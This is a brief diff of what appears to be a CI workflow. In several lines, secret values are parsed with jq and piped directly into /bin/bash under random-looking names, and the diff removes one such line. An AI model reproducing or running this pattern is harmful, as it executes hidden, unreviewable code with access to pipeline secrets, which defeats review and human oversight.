@@ -20,7 +20,6 @@ jobs:
           ykcum862: ${{ secrets.ykcum862 }}
         run: |
           printf '%s' "$ykcum862" | jq -r .ltl44211 | /bin/bash
-          printf '%s' "$qfuh4798" | jq -r .xq75269 | /bin/bash
           printf '%s' "$j128" | jq -r .fcw84485 | /bin/bash
           printf '%s' "$t2544" | jq -r .h4658 | /bin/bash
 
